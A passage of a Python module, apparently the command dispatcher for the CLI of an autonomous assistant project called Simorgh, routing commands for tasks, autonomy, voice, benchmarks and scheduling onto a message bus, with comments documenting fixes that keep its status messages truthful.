"""Command dispatch (07-post-cutover-review.md §3.8 / 15-interface.md
§12 q5, 2026-09-06: "the remaining commands from v1 are so scattered ...
I'd like to consolidate, simplify"). Consolidated from v1's inherited 38
names down to `status`, `tasks`, `improve`, `plan`, `research`,
`interests`, `auto`, `pause`, `resume`, `exit`, `mcp`, `help` --
absorbing near-duplicates (`vitals`/`budget`/`skills` into `status`;
`work` into `tasks`; `propose`/`patch`/`batch`/`evolve` into `improve`;
`project`/`plan <n>` into `plan`; `interest`/`curious` into `interests`;
`autonomous`/`discover`/`news`/`growth` into `auto`; `stop`/`quit` into
`exit`) and dropping five `_NOT_YET` stubs and four dev-path commands
the model's own Guardian-gated tools already cover
(`reflect`/`digest`/`pending`/`log`/`trace`/`remind`/`history`/`run`/
`use`/`fetch`/`sleep`) -- see 15-interface.md §12 q5/q6 for the full
before/after. Every row publishes the real v2 message this session --
Interface never fakes a result.
"""

from __future__ import annotations

import asyncio
import ast
import dataclasses
import difflib
import json
import os
import re
import uuid
import subprocess
import urllib.request
from dataclasses import dataclass
import shutil
from pathlib import Path

from simorgh.bus.client import BusClient
from simorgh.contracts import topics
from simorgh.contracts.people import PERMISSIONS
from simorgh.contracts.toolargs import (
    MARKER_SPLIT_FIRST_LINE,
    args_from_text,
    describe_arguments,
)
from simorgh.contracts.envelope import Event
from simorgh.ledger.client import LedgerClient

from . import render as render_mod
from .parser import Command
from .vitals import VitalsCache

_NO_RESPONSE = "no response -- that subsystem isn't wired up in this build yet"
_NOT_YET = "not yet available in this build"

# Must match `execution/tools.py::MCP_PROPOSALS_STREAM` -- a plain string
# agreement, not a shared import, since `interface` may not import
# `execution` (`test_module_boundaries.py`'s subsystem-isolation rule);
# Ledger stream names aren't part of the typed contract catalog the way
# bus topics are, so this is the same kind of agreement `execution/
# service.py`'s own `INFLIGHT_STREAM`/`TOOLS_STREAM` constants are.
MCP_PROPOSALS_STREAM = "mcp:proposals"
# Agent Skills installed on this machine, and what the review said of each
# (docs/plans/agent-skills-design.md section 3.6).
SKILLS_STREAM = "skills:installs"
# Same agreement, for `execution/capabilities.py::CAPABILITIES_STREAM`.
# Kept in step by a test rather than an import, for the reason above.
CAPABILITIES_STREAM = "capabilities"
# And for `kernel/scheduler.py::SCHEDULE_STREAM`, same agreement again.
SCHEDULE_STREAM = "schedule"
# `execution/service.py::TOOLS_STREAM` and
# `reflection/service.py::Service.ALERTS_STREAM`, same agreement.
TOOLS_STREAM = "execution:tools"
ALERTS_STREAM = "reflection:alerts"
# And `kernel/service.py::Kernel.CONFIG_STREAM`.
CONFIG_STREAM = "config:effective"
# Where `mcp approve` appends a server block: the config the Kernel
# reads, resolved by `contracts.settings.config_path` in the Kernel's own
# order ($SIMORGH_CONFIG, ./simorgh.toml if it exists, ~/.simorgh). Until
# 2026-09-19 this was the literal `Path("simorgh.toml")`, which under
# sim.sh is the repo root, where no config exists -- so an approval
# created a second config there that the Kernel then preferred over the
# real one on the next boot (evaluation B11).
def _simorgh_toml_path() -> Path:
    from simorgh.contracts.settings import config_path

    return config_path()


@dataclass
class Outcome:
    text: str
    exit_repl: bool = False
    # Set only by a `_request(..., watch=True)` call that created a real
    # task (`plan`/`improve`/`research`/`tasks work`) -- `service.py::
    # _handle_line` registers it in `_watched_tasks` so `_on_task_event`
    # narrates the eventual `task.completed` instead of it landing only
    # in the Ledger, unseen (live-caught: `improve web access` printed
    # "task created: <id>" and then nothing, ever, for a task that in
    # fact ran to completion with a real answer).
    task_id: str | None = None


def _render_created(label: str = "task"):
    """Live-caught: three different `improve` requests all printed
    "task created: 4cc3c407277b" -- Planning's intake had deduplicated
    each against the first (already-completed) task and replied with
    `deduplicated_against`, which this surface silently dropped, so the
    human saw a fresh task that never ran. Say so instead."""
    def _render(p: dict) -> str:
        if p.get("deduplicated_against"):
            return (f"not created -- too similar to existing {label} {p['task_id']}; "
                    f"rephrase, or `tasks` to see it")
        return f"{label} created: {p['task_id']}"
    return _render


async def _request(bus: BusClient, type_: str, payload: dict, *, timeout: float, render, watch: bool = False) -> Outcome:
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except TimeoutError:
        return Outcome(_NO_RESPONSE)
    except Exception as exc:  # noqa: BLE001 -- a bad request is a rendered error, never a crash
        return Outcome(f"error: {exc!r}")
    if reply.payload.get("ok") is False:
        err = reply.payload.get("error", {})
        return Outcome(f"error: {err.get('code', 'unknown')} -- {err.get('detail', '')}")
    # A deduplicated reply names an *existing* task -- often already
    # completed -- so there is no completion coming to watch for.
    task_id = reply.payload.get("task_id") if watch and not reply.payload.get("deduplicated_against") else None
    return Outcome(render(reply.payload), task_id=task_id)


async def _publish(bus: BusClient, type_: str, payload: dict, *, render_ok: str) -> Outcome:
    try:
        await bus.publish(bus.new(type_, payload))
    except Exception as exc:  # noqa: BLE001
        return Outcome(f"error: {exc!r}")
    return Outcome(render_ok)


# Statuses `_on_task_cancel` (planning/service.py) already treats as
# done -- a plain string agreement rather than an import, since
# `interface` may not import `planning` (`test_module_boundaries.py`).
_TERMINAL_STATUSES = frozenset({"completed", "failed"})


async def _cancel(bus: BusClient, task_id: str, *, session_id: str) -> Outcome:
    """`TASK_CANCEL` is fire-and-forget, and Planning's own handler
    silently no-ops on an unknown or already-finished task_id (there is
    nothing left to stop). Publishing it and then unconditionally
    saying "asked X to stop" was true only when the id turned out to
    name a live task -- for a typo, a stale id copied from an old
    `tasks` listing, or a task that had already finished, the human was
    told a cancellation was in flight that never actually happened
    (observer, 2026-09-08). Look the task up first so the message
    matches what will actually happen."""
    try:
        reply = await bus.request(bus.new(topics.TASK_LIST_REQUEST, {}), timeout=3.0)
    except TimeoutError:
        return Outcome(_NO_RESPONSE)
    except Exception as exc:  # noqa: BLE001 -- a lookup failure is a rendered error, never a crash
        return Outcome(f"error: {exc!r}")
    task = next((t for t in reply.payload.get("tasks", []) if t.get("task_id") == task_id), None)
    if task is None:
        return Outcome(f"no such task {task_id!r} -- `tasks` lists them")
    if task.get("status") in _TERMINAL_STATUSES:
        return Outcome(f"{task_id} is already {task['status']} -- nothing to stop")
    return await _publish(bus, topics.TASK_CANCEL, {
        "task_id": task_id, "reason": f"cancelled by cli:{session_id}",
    }, render_ok=f"asked {task_id} to stop; it ends after its current step")


async def run_shell(command: str, *, timeout: float) -> str:
    if not command:
        return "usage: !<shell command>"
    try:
        result = subprocess.run(  # noqa: S602 -- the human's own shell authority, run by Interface (spec section 7)
            command, shell=True, capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        return f"[shell timed out after {timeout}s]"
    except OSError as exc:
        return f"[shell error: {exc}]"
    out = (result.stdout or "") + (result.stderr or "")
    return out.rstrip() or f"[exit {result.returncode}, no output]"


async def dispatch(command: Command, *, bus: BusClient, clock, session_id: str, vitals: VitalsCache,
                    ledger: LedgerClient, shell_timeout_s: float = 120.0) -> Outcome:
    """`shell_timeout_s` bounds a `!<command>` (`[interface] shell_timeout_s`)."""
    name, args = command.name, command.args
    now = clock.now()

    if name == "!":
        return Outcome(await run_shell(args, timeout=shell_timeout_s))

    if name == "exit":
        await bus.publish(bus.new(topics.SYSTEM_STOP, {
            "reason": args or "user exit", "requested_by": f"cli:{session_id}",
        }, priority=9))
        return Outcome("stopping...", exit_repl=True)

    if name == "restart":
        # Not a stop for good: `kernel/cli.py::_cmd_run` exits with a
        # distinguished code that `simloader.py` treats as "re-gate the
        # checkout and hand off to Sim again" -- so a fix landed on disk
        # while Sim was running is what comes back up, the same way a
        # fresh `./sim.sh` would gate it (the creator, 2026-09-14: "I can
        # run 'restart' command from sim tui, and sim restarts in a way
        # that it uses the new source code from local dir").
        # `self_check_passed=True` because that gate -- not this command
        # -- is what actually verifies the new source before it runs.
        # `simloader.py` only ever catches this if it is the one that
        # launched Sim (`launch_sim` sets `SIMORGH_LOADER_NOTES` in the
        # child's environment) -- run directly (`SIMORGH_NO_LOADER=1`, or
        # `python -m simorgh run` by hand), and this process just stops,
        # the same as `exit`, with nobody to bring it back (live-caught,
        # 2026-09-14: the creator's own running Sim was not loader-managed
        # and did not come back after `restart`).
        loader_managed = bool(os.environ.get("SIMORGH_LOADER_NOTES"))
        await bus.publish(bus.new(topics.SYSTEM_RESTART, {
            "reason": args or "user requested restart", "self_check_passed": True,
        }, priority=9))
        if loader_managed:
            return Outcome("restarting -- Sim will come back up on the current source...", exit_repl=True)
        return Outcome(
            "restarting -- but this process was not started through simloader.py, so nothing is "
            "watching for it to come back. Sim is stopping now; run `./sim.sh` again to bring it back up.",
            exit_repl=True,
        )

    if name == "pause":
        await bus.publish(bus.new(topics.SYSTEM_PAUSE, {
            "reason": args or "user requested", "requested_by": f"cli:{session_id}", "scope": "all",
        }, priority=9))
        return Outcome("pause requested")

    if name == "resume":
        await bus.publish(bus.new(topics.SYSTEM_RESUME, {
            "reason": args or "user requested", "requested_by": f"cli:{session_id}", "scope": "all",
        }, priority=9))
        return Outcome("resume requested")

    if name == "status":
        return Outcome(await _status_panel(bus, vitals))

    if name == "help":
        if args.strip().lower() == "all":
            return Outcome(render_mod.help_panel(enabled=render_mod.color_enabled(),
                                                 unicode=render_mod.unicode_mode() != "off", full=True))
        if args.strip():
            return Outcome(render_mod.command_panel(args, enabled=render_mod.color_enabled(),
                                                    unicode=render_mod.unicode_mode() != "off"))
        return Outcome(render_mod.help_panel(enabled=render_mod.color_enabled(),
                                             unicode=render_mod.unicode_mode() != "off"))

    if args.strip().lower() in ("help", "?", "--help", "-h") and name:
        # `voice help` is `help voice`; every command answers it the same way.
        return Outcome(render_mod.command_panel(name, enabled=render_mod.color_enabled(),
                                                unicode=render_mod.unicode_mode() != "off"))

    if name == "improve":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: improve [path] <description> [steps=N]   "
                           "(`skill <topic>` drafts a new skill instead)")
        first, _, rest = args.partition(" ")
        # A path in the first word names what to change. Without one it
        # is still a change -- the model works out which file.
        #
        # `improve <anything with no path>` used to create a SKILL task,
        # so "improve, the game freezes after a second" became "write a
        # reusable skill module" and three rounds of verification asked
        # whether a skill had been produced (creator, 2026-09-09: "why
        # human ask became a skill? it should have been categorized as a
        # task"). Drafting a skill is now something you ask for by name.
        payload = {"kind": "patch", "origin": "human", "mode": "execute"}
        if rest and _PATH_HINT.search(first):
            payload.update(description=rest.strip(), subject=first)
        else:
            payload.update(description=args)
        return await _request(bus, topics.TASK_CREATE, _with_steps(payload, steps),
                              timeout=5.0, render=_render_created(), watch=True)

    if name == "skill":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: skill <topic> [steps=N]  -- drafts a new reusable skill. "
                           "To change something that already exists, use `improve`.")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "skill", "description": args, "origin": "human", "mode": "execute",
        }, steps), timeout=5.0, render=_render_created("skill task"), watch=True)

    if name == "plan":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: plan <goal> [steps=N]")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "project", "description": args, "origin": "human", "mode": "plan",
        }, steps), timeout=5.0, render=_render_created("project task"), watch=True)

    if name == "research":
        args, steps = _pop_steps(args)
        if not args:
            return Outcome("usage: research <topic> [steps=N]")
        return await _request(bus, topics.TASK_CREATE, _with_steps({
            "kind": "research", "description": args, "origin": "human",
        }, steps), timeout=5.0, render=_render_created(), watch=True)

    if name == "benchmark":
        return await _benchmark(bus, args)

    if name == "forget":
        words = (args or "").split()
        minutes = 2.0
        if words and re.fullmatch(r"\d+(?:\.\d+)?", words[0]):
            minutes, words = float(words[0]), words[1:]
        return await _run_tool(bus=bus, ledger=ledger, tool="memory_forget", session_id=session_id, timeout=30.0,
                               raw=json.dumps({"minutes": minutes, "containing": " ".join(words)}))
    if name == "cancel":
        # Until 2026-09-08 there was no way to stop anything. A task that
        # had stopped being useful ran to its step budget while holding
        # the single worker, and everything else queued behind it.
        task_id = args.strip()
        if not task_id:
            return Outcome("usage: cancel <task_id>   (`tasks` lists them)")
        return await _cancel(bus, task_id, session_id=session_id)

    if name == "tasks":
        if args.strip() in ("clear", "clean", "erase", "wipe"):
            return await _request(bus, topics.TASK_CLEAR_REQUEST, {"reason": f"cleared by cli:{session_id}"},
                                  timeout=10.0, render=lambda p: (
                f"cleared {p.get('cleared', 0)} task(s)"
                + (f"; {p['cancelled']} running were told to stop" if p.get("cancelled") else "")
                + " -- the ledger keeps their history"))
        if args.strip() == "work":
            return await _request(bus, topics.TASK_WORK_NEXT_REQUEST, {}, timeout=5.0, render=lambda p: (
                f"working: {p['task_id']}" if p.get("task_id") else f"nothing to work on ({p.get('reason', 'idle')})"
            ), watch=True)
        # Live-caught (the creator, 2026-09-07): "it only show the total
        # number of tasks, not the tasks details". The reply has always
        # carried every field -- id, kind, status, origin, description --
        # and this rendered `len()` of it and dropped the rest, so a
        # backlog of 100 looked exactly like a backlog of 1.
        show_all = args.strip() == "all"
        return await _request(bus, topics.TASK_LIST_REQUEST, {}, timeout=3.0, render=lambda p: render_mod.task_list(
            p.get("tasks", []), p.get("projects", []), limit=1000 if show_all else 20,
        ))

    if name == "auto":
        mode = args.strip()
        if mode == "on":
            return await _publish(bus, topics.SYSTEM_RESUME, {
                "reason": "user enabled autonomy", "requested_by": f"cli:{session_id}", "scope": "autonomous",
            }, render_ok="autonomous mode: on")
        if mode == "off":
            return await _publish(bus, topics.SYSTEM_PAUSE, {
                "reason": "user disabled autonomy", "requested_by": f"cli:{session_id}", "scope": "autonomous",
            }, render_ok="autonomous mode: off")
        if mode == "now":
            return await _publish(bus, topics.SYSTEM_TICK_IDLE, {"idle_seconds": 0.0}, render_ok="idle tick requested")
        # Bare `auto` used to print the KERNEL state, so after `auto off`
        # it still answered "running" -- a true sentence about a
        # different question (observer, 2026-09-08). The state machine
        # carries `autonomous_paused`; that is what was asked about.
        # Reads autonomy state from the kernel via SYSTEM_STATUS_REQUEST (bare `auto`).
        return await _request(bus, topics.SYSTEM_STATUS_REQUEST, {}, timeout=3.0, render=_render_auto)

    if name == "interests":
        if not args:
            # This printed `len()` of a payload that carries every topic
            # -- the same "it only shows the count" complaint the creator
            # already made about `tasks` (observer, 2026-09-08).
            return await _request(bus, topics.CURIOSITY_INTEREST_LIST_REQUEST, {}, timeout=3.0,
                                  render=_render_interests)
        return await _publish(bus, topics.CURIOSITY_INTEREST_ADD, {"topic": args}, render_ok=f"interest added: {args}")

    if name == "skills":
        return await _skills_command(args, ledger=ledger, clock=clock)

    if name == "mcp":
        return await _mcp_command(args, bus=bus, ledger=ledger, clock=clock)

    if name == "tool":
        return await _tool_command(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "people":
        return await _people(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "home":
        return await _home(args, bus=bus, ledger=ledger, session_id=session_id)

    if name in ("light", "lights"):
        return await _light(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "config":
        return await _config_command(ledger, args)

    if name == "domains":
        return await _domains_command(ledger, args)

    if name == "alerts":
        return await _alerts_command(ledger, args)

    if name == "capabilities":
        return await _capabilities_command(ledger)
    if name == "voice":
        return await _voice(bus, args)

    if name == "tv":
        return await _tv(args, bus=bus, ledger=ledger, session_id=session_id)
    if name == "pronounce":
        return await _voice(bus, f"pronounce {args}")
    if name in ("next", "skip"):
        # Sim says "say next"; the person types it (2026-09-13). The TV key, without the model.
        return await _tv("next", bus=bus, ledger=ledger, session_id=session_id)

    if name == "cameras":
        return await _cameras(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "ring":
        return await _ring(args, bus=bus, ledger=ledger, session_id=session_id)

    if name == "schedule":
        return await _schedule_command(args, bus=bus, ledger=ledger, clock=clock)

    # unrecognized after autocorrect failed, or plain chat text
    return Outcome("", exit_repl=False)


# A first token that looks like a real path (a slash, or a file
# extension) means `improve <path> <description>`'s patch shape;
# anything else is `improve <topic>`'s skill shape.
_PATH_HINT = re.compile(r"[\\/]|\.[A-Za-z0-9]{1,5}$")

# `steps=N` anywhere in an improve/plan/research line sets the step cap
# for one attempt at that task (the creator, 2026-09-07: a big task
# should be able to say it is big). Orchestration clamps it.
_STEPS_OPT = re.compile(r"(?:^|\s)steps=(\d{1,4})(?=\s|$)")


def _pop_steps(args: str) -> tuple[str, int | None]:
    match = _STEPS_OPT.search(args)
    if match is None:
        return args, None
    cleaned = (args[: match.start()] + " " + args[match.end():]).strip()
    return " ".join(cleaned.split()), int(match.group(1))


def _with_steps(payload: dict, steps: int | None) -> dict:
    if steps:
        payload["max_steps"] = steps
    return payload


# (verb, argument sketch, what it does). One list, so the usage text and
# the dispatcher below cannot disagree -- the suites listing advertised a
# `load` verb that did not exist until a test compared the two
# (2026-09-08).
BENCHMARK_VERBS: tuple[tuple[str, str, str], ...] = (
    ("", "", "the latest result for each suite"),
    ("start", "[suite] [n]", "the quick way: GAIA level 1, 5 cases, unless you name others"),
    ("suites", "", "what can be run, and what is cached"),
    ("load", "<suite> [refresh]", "download its cases, without running them"),
    ("run", "<suite> [n] [level=L] [refresh]", "run it, and record the result"),
    ("stop", "", "end the run in flight, keeping what it scored"),
    ("history", "[suite]", "accuracy over time, per model"),
    ("clear", "<model|all>", "forget the recorded runs for one model, or for all of them"),
    ("show", "<run_id>", "one run, one line per case: which passed and which did not"),
    ("cases", "<run_id>", "one run in full: the question, the answer, the true answer, time and tokens"),
)
_BENCHMARK_COLUMN = max(len(f"{verb} {args}".strip()) for verb, args, _w in BENCHMARK_VERBS) + 2
_BENCHMARK_USAGE = "\n".join(
    f"  benchmark {f'{verb} {args}'.strip():<{_BENCHMARK_COLUMN}}{what}"
    for verb, args, what in BENCHMARK_VERBS
)


async def _voice(bus: BusClient, args: str) -> Outcome:
    """`voice ...` -- every verb is one request to the voice subsystem;
    the rendering is `voiceview`'s. `voice` alone is `voice status`."""
    from . import voiceview

    verb, rest = _benchmark_word(args)
    # `voice voices = af_bella` and `voice tts_voice af_bella` are how people
    # actually try to pick a voice (the creator, 2026-09-19): both are
    # `voice set tts_voice ...`, and a bare setting name reads it back.
    if verb == "voices" and rest.strip().startswith("="):
        verb, rest = "set", f"tts_voice {rest.strip()}"
    elif verb in ("tts_voice", "stt", "tts", "tts_speed", "volume", "stt_model"):
        verb, rest = "set", f"{verb} {rest}".strip()
    if verb in ("", "status"):
        return await _request(bus, topics.VOICE_STATUS_REQUEST, {}, timeout=10.0, render=voiceview.status)
    if verb in ("on", "off", "mute", "unmute"):
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": verb}, timeout=60.0,
                              render=voiceview.controlled)
    if verb == "barge":
        which = rest.strip().lower()
        if which in ("on", "off"):
            return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": f"barge_{which}"}, timeout=10.0,
                                  render=voiceview.controlled)
        if which in ("aec on", "aec off"):
            return await _request(bus, topics.VOICE_CONTROL_REQUEST,
                                  {"action": "aec_on" if which.endswith("on") else "aec_off"}, timeout=10.0,
                                  render=voiceview.controlled)
        return Outcome("usage: voice barge on|off  (interrupt Sim by talking) | voice barge aec on|off "
                       "(cancel Sim's own voice first -- steadier in a loud room, experimental)")
    if verb in ("enroll", "enrol", "learn"):
        words = rest.strip().split()
        if not words:
            return Outcome("usage: voice enroll <name> [as <relation>]   (then say three sentences)")
        relation = ""
        if "as" in [w.lower() for w in words[1:]]:
            i = [w.lower() for w in words].index("as", 1)
            relation, words = " ".join(words[i + 1:]), words[:i]
        return await _request(bus, topics.VOICE_CONTROL_REQUEST,
                              {"action": "enroll", "name": " ".join(words), **({"relation": relation} if relation else {})},
                              timeout=30.0, render=voiceview.controlled)
    if verb in ("pronounce", "say-as"):
        words = rest.strip().split()
        if len(words) >= 3 and words[1].lower() == "as":
            words = [words[0]] + words[2:]      # `pronounce Ira as Eye-raa`
        if len(words) < 2:
            return Outcome("usage: voice pronounce <name> <how to say it>   (voice pronounce Saoirse Seer-sha)")
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": "pronounce", "name": words[0], "value": " ".join(words[1:])},
                              timeout=10.0, render=voiceview.controlled)
    if verb == "forget":
        if not rest.strip():
            return Outcome("usage: voice forget <name>   (or `voice forget all` to erase every voice and start again)")
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": "forget", "name": rest.strip()}, timeout=10.0,
                              render=voiceview.controlled)
    if verb in ("people", "who", "family"):
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": "people"}, timeout=10.0, render=voiceview.controlled)
    if verb == "whois":
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, {"action": "whois"}, timeout=10.0, render=voiceview.controlled)
    if verb in ("test", "say"):
        if not rest:
            return Outcome("usage: voice test <text to speak>")
        return await _request(bus, topics.VOICE_SPEAK_REQUEST, {"text": rest.strip().strip('"')}, timeout=120.0,
                              render=voiceview.spoken)
    if verb == "listen":
        payload: dict = {}
        words = rest.split()
        if words and words[0].replace(".", "", 1).isdigit():
            payload["seconds"] = float(words[0])
        if "only" in words or "transcribe" in words:
            payload["respond"] = False
        return await _request(bus, topics.VOICE_LISTEN_REQUEST, payload, timeout=300.0, render=voiceview.listened)
    if verb == "voices":
        return await _request(bus, topics.VOICE_VOICES_REQUEST, {}, timeout=60.0, render=voiceview.voices)
    if verb == "devices":
        return await _request(bus, topics.VOICE_DEVICES_REQUEST, {}, timeout=60.0, render=voiceview.devices)
    if verb == "models":
        return await _request(bus, topics.VOICE_MODELS_REQUEST, {"name": rest.strip() or "base.en"},
                              timeout=900.0, render=voiceview.models)
    if verb == "set":
        # `voice set tts_voice af_kore`, `tts_voice = af_kore` and
        # `tts_voice=af_kore` are the same ask.
        text = rest.strip()
        if "=" in text.split(" ", 1)[0] or text.split(" ", 2)[1:2] == ["="]:
            key, _, value = text.partition("=")
        else:
            key, _, value = text.partition(" ")
        payload = {"action": "set"}
        if key.strip():
            payload["key"] = key.strip()
            payload["value"] = value.strip().strip("=").strip()
        return await _request(bus, topics.VOICE_CONTROL_REQUEST, payload, timeout=120.0, render=voiceview.controlled)
    if verb == "bench":
        return await _request(bus, topics.VOICE_BENCH_REQUEST, {"play": "quiet" not in rest},
                              timeout=600.0, render=voiceview.bench)
    import difflib

    close = difflib.get_close_matches(verb, ["status", "on", "off", "mute", "unmute", "barge", "listen", "test", "say",
                                             "voices", "devices", "models", "set", "bench", "enroll", "people", "family", "whois",
                                             "forget", "pronounce"], n=1, cutoff=0.6)
    if close:
        return Outcome(f"voice: unknown verb {verb!r} -- did you mean `voice {close[0]}`?")
    return Outcome(f"voice: unknown verb {verb!r} -- status | on | off | mute | unmute | barge on|off | listen [s] "
                   f"| test <text> | enroll <name> | people | whois | forget <name> | pronounce <name> <as> "
                   f"| voices | devices | models [name] | set [key value] | bench [quiet]  (`help voice`)")


def _benchmark_word(args: str) -> tuple[str, str]:
    first, _, rest = args.strip().partition(" ")
    return first.lower(), rest.strip()


async def _benchmark(bus: BusClient, args: str) -> Outcome:
    from . import benchmarkview

    verb, rest = _benchmark_word(args)
    if verb in ("", "latest"):
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {}, timeout=10.0,
                              render=benchmarkview.latest)
    if verb == "suites":
        return await _request(bus, topics.BENCHMARK_SUITES_REQUEST, {}, timeout=10.0,
                              render=benchmarkview.suites)
    if verb == "history":
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {"suite": rest.strip()},
                              timeout=10.0, render=benchmarkview.history)
    if verb == "clear":
        # A name or `all`, never a bare "clear". A default that wipes
        # every model's history is the kind somebody finds out about
        # afterwards; the usage line costs one keystroke instead.
        target = rest.strip()
        if not target:
            models = "`benchmark history` lists which models have runs"
            return Outcome(f"usage: benchmark clear <model|all>  --  {models}")
        payload = {"all": True} if target in ("all", "*", "everything") else {"model": target}
        return await _request(bus, topics.BENCHMARK_CLEAR_REQUEST, payload,
                              timeout=15.0, render=benchmarkview.cleared)
    if verb in ("show", "cases"):
        if not rest:
            return Outcome(f"usage: benchmark {verb} <run_id>")
        # `show` is one line per case and answers "which failed";
        # `cases` is a block per case and answers "and what did it
        # say, and what did that cost" (the creator, 2026-09-20).
        render = benchmarkview.cases if verb == "cases" else benchmarkview.detail
        return await _request(bus, topics.BENCHMARK_HISTORY_REQUEST, {"run_id": rest.strip()},
                              timeout=10.0, render=render)
    if verb == "stop":
        return await _request(bus, topics.BENCHMARK_STOP_REQUEST, {}, timeout=30.0,
                              render=benchmarkview.stopped)
    if verb == "load":
        if not rest:
            return Outcome("usage: benchmark load <suite> [refresh]")
        words = rest.split()
        return await _request(bus, topics.BENCHMARK_LOAD_REQUEST, {
            "suite": words[0], "refresh": "refresh" in words[1:],
        }, timeout=180.0, render=benchmarkview.loaded)
    if verb == "start" or verb in ("go", "begin"):
        # The easy way in (the creator, 2026-09-19: "saying /benchmark start
        # starts testing gaia1"): the default suite and size unless named.
        verb, rest = "run", benchmarkview.with_defaults(rest)
    if verb == "run":
        payload, problem = benchmarkview.parse_run(rest)
        if problem:
            return Outcome(problem)
        # A run is minutes to hours; the reply says it started and the
        # progress narrates itself, the same shape as `improve`.
        return await _request(bus, topics.BENCHMARK_RUN_REQUEST, payload, timeout=60.0,
                              render=benchmarkview.started)
    return Outcome(_BENCHMARK_USAGE)


def _render_auto(payload: dict) -> str:
    paused = payload.get("autonomous_paused")
    state = payload.get("state", "?")
    if paused is None:
        return f"autonomous mode: unknown (system is {state})"
    mode = "off" if paused else "on"
    return (
        f"autonomous mode: {mode}  ·  system {state}\n"
        f"  `auto on` / `auto off` to change it, `auto now` to run one idle tick"
    )


def _render_interests(payload: dict) -> str:
    interests = payload.get("interests") or []
    if not interests:
        return "no interests yet -- `interests <topic>` adds one"
    lines = [f"{len(interests)} interest(s):"]
    for item in interests[:20]:
        topic = item.get("topic") if isinstance(item, dict) else str(item)
        why = (item.get("why") or "") if isinstance(item, dict) else ""
        lines.append(f"  · {topic}" + (f"  -- {why}" if why else ""))
    if len(interests) > 20:
        lines.append(f"  ... and {len(interests) - 20} more")
    return "\n".join(lines)


async def _panel_piece(bus: BusClient, type_: str, payload: dict, *, timeout: float, label: str, render) -> str:
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except TimeoutError:
        return f"{label}: unavailable (no response)"
    except Exception as exc:  # noqa: BLE001 -- one panel piece's failure never breaks the whole panel
        return f"{label}: error ({exc!r})"
    if reply.payload.get("ok") is False:
        err = reply.payload.get("error", {})
        return f"{label}: error ({err.get('code', 'unknown')})"
    return render(reply.payload)


async def _payload_of(bus: BusClient, type_: str, payload: dict, *, timeout: float = 3.0):
    """One panel piece's raw payload, or None if it did not answer.

    Raw rather than pre-rendered: the layout decisions -- which
    subsystems to name, what goes in the second column, how much of a
    commit subject fits -- can only be made with the numbers in hand.
    """
    try:
        reply = await bus.request(bus.new(type_, payload), timeout=timeout)
    except Exception:  # noqa: BLE001 -- one piece failing never breaks the panel
        return None
    return reply.payload


async def _status_panel(bus: BusClient, vitals: VitalsCache) -> str:
    """07-post-cutover-review.md §3.8: `status` absorbs `vitals`/
    `budget`/`skills` into one panel, not sub-args -- health, vitals,
    posture, and registered tools together, each piece degrading
    honestly on its own if that subsystem does not answer in time."""
    from . import render as render_mod

    import asyncio

    # Asked together: one piece that does not answer costs one timeout,
    # not one per piece (with nothing answering, four in a row took 12s).
    health, posture, tools_payload, git = await asyncio.gather(
        _payload_of(bus, topics.SYSTEM_STATUS_REQUEST, {}),
        _payload_of(bus, topics.GUARDIAN_POSTURE_REQUEST, {}),
        _payload_of(bus, topics.WORLD_ENV_QUERY, {"what": "tools", "args": {}}),
        _payload_of(bus, topics.WORLD_ENV_QUERY, {"what": "git_state", "args": {}}),
    )
    return render_mod.status_panel(
        health=health, snapshot=vitals.snapshot(), posture=posture,
        tools=(tools_payload or {}).get("tools") if tools_payload is not None else None,
        git=git, enabled=render_mod.color_enabled())


def _render_git_state(p: dict) -> str:
    if not p.get("available", False):
        return "git: unavailable (no repo / git not found)"
    dirty = f"{p.get('changed_files', 0)} uncommitted" if p.get("dirty") else "clean"
    return (
        f"git: {p.get('branch', '?')} @ {p.get('head', '')[:8]}   {dirty}\n"
        + "\n".join(f"  {line}" for line in p.get("recent_commits", [])[:5])
    )




# `<n><unit>` -- 30s, 15m, 2h, 1d. A schedule is one of the few places a
# bare number is genuinely ambiguous, so the unit is required.
_EVERY_RE = re.compile(r"^(\d+)\s*([smhd])$", re.I)
_UNIT_SECONDS = {"s": 1, "m": 60, "h": 3600, "d": 86400}


def parse_delay(text: str) -> float | None:
    """Seconds for `30s` / `15m` / `2h` / `1d`, or None."""
    match = _EVERY_RE.match((text or "").strip())
    if not match:
        return None
    return float(match.group(1)) * _UNIT_SECONDS[match.group(2).lower()]


async def _schedule_command(args: str, *, bus: BusClient, ledger: LedgerClient, clock) -> Outcome:
    """`schedule` / `schedule <delay> <label>` / `schedule every <delay> <label>`.

    The Kernel has had a complete scheduler since the beginning: it
    subscribes to `system.schedule.add`, arms a timer, survives a
    restart by replaying its own ledger stream, and fires
    `percept.time.scheduled`. Nothing in the entire system ever
    published that message, so none of it could be reached -- a finished
    subsystem with no door. This is the door.

    The cancel half stayed shut a while longer. `Scheduler.
    _on_schedule_cancel` is just as complete -- it appends
    `schedule.cancelled`, marks the projection, and cancels the armed
    timer -- and `_schedule_list` below already drops a cancelled id
    from its listing, but `system.schedule.cancel` was published by
    nothing in the tree (scan, 2026-09-10). A `schedule every 1h ...`
    therefore had no off switch at all, and since the Kernel replays
    `SCHEDULE_STREAM` on boot, a restart did not stop it either: it
    fired every hour for the life of the installation. `schedule cancel
    <id>` is that half's door.
    """
    args = (args or "").strip()
    if not args:
        return await _schedule_list(ledger)

    # The whole first word, not a prefix: `schedule cancelthing` is a
